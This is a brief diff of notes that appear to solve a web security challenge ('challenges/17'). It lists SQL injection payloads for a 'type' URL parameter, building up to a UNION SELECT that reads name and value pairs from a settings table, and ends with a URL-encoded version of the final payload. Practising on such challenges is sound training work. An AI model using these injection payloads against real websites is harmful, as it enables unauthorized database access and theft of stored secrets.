@@ -1,0 +1,7 @@
+?type=cat AND 1=1#
+?type=cat AND 1=1 UNION SELECT name,value from settings#
+?type=cat AND 1=1 UNION SELECT name,value,null from settings#
+
+(encode # since part of URL)
+
+/challenges/17/index.php?type=cat%27%20AND%201=1%20UNION%20SELECT%20name,%20value,%20null%20FROM%20settings%23
